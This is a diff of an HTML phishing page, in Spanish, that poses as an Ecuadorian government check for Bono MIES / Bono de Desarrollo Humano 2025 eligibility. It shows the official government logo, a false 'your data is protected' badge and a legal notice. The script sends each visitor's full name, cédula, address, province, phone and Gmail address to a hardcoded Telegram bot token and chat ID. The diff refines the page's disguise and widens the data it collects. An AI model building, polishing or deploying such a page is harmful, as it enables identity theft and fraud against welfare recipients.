@@ -2,74 +2,154 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Consulta Bono MIES</title>
 <style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+
   body {
-    font-family: Arial, sans-serif;
-    background-color: #f2f2f2;
-    margin: 0;
-    padding: 0;
+    background: #f0f2f5;
+    font-family: 'Poppins', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .container {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 540px;
+    padding: 25px;
+    box-sizing: border-box;
+  }
+
+  .header {
     display: flex;
     justify-content: center;
     align-items: center;
-    min-height: 100vh;
+    margin-bottom: 10px;
   }
-  .container {
-    background: #fff;
-    padding: 20px;
-    border-radius: 10px;
-    width: 90%;
-    max-width: 400px;
-    box-shadow: 0 0 15px rgba(0,0,0,0.1);
+
+  .header img {
+    width: 140px;
+    height: auto;
   }
-  h2 {
+
+  .divider {
+    width: 100%;
+    height: 2px;
+    background-color: #0b44a4;
+    margin: 12px 0 20px 0;
+    border-radius: 1px;
+  }
+
+  h1 {
+    font-size: 20px;
+    font-weight: 700;
+    color: #111b35;
+    margin-bottom: 20px;
     text-align: center;
-    color: #333;
   }
+
   label {
     display: block;
-    margin-top: 10px;
-    font-weight: bold;
+    font-size: 14px;
+    color: #111b35;
+    margin-bottom: 6px;
+    font-weight: 600;
   }
-  input {
+
+  input[type="text"], input[type="tel"], input[type="email"] {
     width: 100%;
-    padding: 8px;
-    margin-top: 5px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
+    padding: 10px 14px;
+    font-size: 15px;
+    border-radius: 8px;
+    border: 1.7px solid #c3cad9;
+    margin-bottom: 14px;
+    transition: border-color 0.3s ease;
+    box-sizing: border-box;
   }
+
+  input:focus {
+    border-color: #0b234d;
+    outline: none;
+  }
+
+  .security {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    color: #2a5a27;
+    margin-bottom: 18px;
+  }
+
+  .security svg {
+    width: 18px;
+    height: 18px;
+    fill: #2a5a27;
+  }
+
   button {
-    margin-top: 15px;
     width: 100%;
-    padding: 10px;
-    background: #007bff;
+    background: #0b44a4;
     color: white;
-    font-size: 16px;
+    font-weight: 700;
+    font-size: 15px;
+    padding: 12px 0;
     border: none;
-    border-radius: 5px;
+    border-radius: 8px;
     cursor: pointer;
+    text-transform: uppercase;
+    box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
+    transition: background-color 0.3s ease;
   }
+
   button:hover {
-    background: #0056b3;
+    background: #09377d;
   }
-  .popup {
-    display: none;
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: white;
-    padding: 20px;
-    border-radius: 15px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+
+  .legal {
+    font-size: 11px;
+    color: #5a5f6b;
+    margin-top: 15px;
+    line-height: 1.4;
     text-align: center;
-    z-index: 1000;
-    max-width: 90%;
   }
-  .popup p {
-    margin: 0;
-    font-size: 16px;
+
+  /* Estilo del pop-up */
+  .popup {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.5);
+    display: none;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .popup-content {
+    background: white;
+    padding: 25px 30px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 380px;
+    text-align: center;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+  }
+
+  .popup-content h2 {
+    font-size: 18px;
+    color: #0b44a4;
+    margin-bottom: 12px;
+  }
+
+  .popup-content p {
+    font-size: 14px;
     color: #333;
   }
 </style>
@@ -77,50 +157,80 @@
 <body>
 
 <div class="container">
-  <h2>Consulta Bono MIES</h2>
-  <form id="consultaForm">
-    <label for="cedula">Número de cédula:</label>
-    <input type="text" id="cedula" name="cedula" pattern="[0-9]{10}" required>
+  <div class="header">
+    <img src="https://www.derechoshumanos.gob.ec/wp-content/uploads/2023/06/Gob_Ecuador.png" alt="Gobierno del Ecuador Logo" />
+  </div>
 
-    <label for="telefono">Teléfono:</label>
-    <input type="tel" id="telefono" name="telefono" pattern="[0-9]{7,10}" required>
+  <div class="divider"></div>
 
-    <label for="email">Correo electrónico (Gmail):</label>
-    <input type="email" id="email" name="email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required>
+  <h1>Consulta si eres beneficiario del Bono de Desarrollo Humano 2025</h1>
 
-    <label for="fechaNacimiento">Fecha de nacimiento:</label>
-    <input type="date" id="fechaNacimiento" name="fechaNacimiento" required>
+  <form id="bonoForm" autocomplete="off" novalidate>
+    <label for="nombre">Nombre completo</label>
+    <input type="text" id="nombre" name="nombre" required />
+
+    <label for="cedula">Cédula</label>
+    <input type="text" id="cedula" name="cedula" maxlength="10" pattern="[0-9]{10}" required />
+
+    <label for="provincia">Provincia / Ciudad</label>
+    <input type="text" id="provincia" name="provincia" required />
+
+    <label for="direccion">Dirección</label>
+    <input type="text" id="direccion" name="direccion" required />
+
+    <label for="telefono">Número de teléfono</label>
+    <input type="tel" id="telefono" name="telefono" maxlength="10" pattern="[0-9]{7,10}" required />
+
+    <label for="email">Correo electrónico (Gmail)</label>
+    <input type="email" id="email" name="email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required />
+
+    <div class="security">
+      <svg viewBox="0 0 24 24"><path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/></svg>
+      Tus datos están protegidos.
+    </div>
 
     <button type="submit">Consultar</button>
   </form>
+
+  <div class="legal">
+    La información ingresada será tratada conforme a la Ley de Protección de Datos Personales.
+  </div>
 </div>
 
+<!-- Pop-up de mensaje -->
 <div class="popup" id="popup">
-  <p id="popupMessage"></p>
+  <div class="popup-content">
+    <h2>Consulta enviada</h2>
+    <p id="popupMessage">En caso de aprobarse el bono, será comunicado inmediatamente al número de contacto o Gmail. Gracias.</p>
+  </div>
 </div>
 
 <script>
   const BOT_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
   const CHAT_ID = "5654253897";
 
-  const form = document.getElementById("consultaForm");
-  const popup = document.getElementById("popup");
-  const popupMessage = document.getElementById("popupMessage");
+  const form = document.getElementById('bonoForm');
+  const popup = document.getElementById('popup');
+  const popupMessage = document.getElementById('popupMessage');
 
-  form.addEventListener("submit", async function(e) {
+  form.addEventListener('submit', async function(e) {
     e.preventDefault();
 
-    const cedula = document.getElementById("cedula").value;
-    const telefono = document.getElementById("telefono").value;
-    const email = document.getElementById("email").value;
-    const fechaNacimiento = document.getElementById("fechaNacimiento").value;
+    const nombre = document.getElementById('nombre').value;
+    const cedula = document.getElementById('cedula').value;
+    const provincia = document.getElementById('provincia').value;
+    const direccion = document.getElementById('direccion').value;
+    const telefono = document.getElementById('telefono').value;
+    const email = document.getElementById('email').value;
 
     const message = `
-📄 *Consulta Bono MIES*
-👤 Cédula: ${cedula}
+📄 *Nuevo registro*
+👤 Nombre: ${nombre}
+🆔 Cédula: ${cedula}
+🏙 Provincia/Ciudad: ${provincia}
+🏠 Dirección: ${direccion}
 📞 Teléfono: ${telefono}
 📧 Email: ${email}
-🎂 Fecha de nacimiento: ${fechaNacimiento}
     `;
 
     try {
@@ -135,22 +245,20 @@
       });
 
       popupMessage.textContent = "En caso de aprobarse, será comunicado inmediatamente.";
-      popup.style.display = "block";
-      setTimeout(() => { popup.style.display = "none"; }, 5000);
+      popup.style.display = 'flex';
+      setTimeout(() => { popup.style.display = 'none'; form.reset(); }, 5000);
 
-      form.reset();
-    } catch (error) {
+    } catch(err) {
       popupMessage.textContent = "Error al enviar la consulta. Inténtelo de nuevo.";
-      popup.style.display = "block";
-      setTimeout(() => { popup.style.display = "none"; }, 5000);
+      popup.style.display = 'flex';
+      setTimeout(() => { popup.style.display = 'none'; }, 5000);
     }
+  });
+
+  popup.addEventListener('click', function(e) {
+    if(e.target === popup) popup.style.display = 'none';
   });
 </script>
 
 </body>
 </html>
-
-
-</body>
-</html>
-
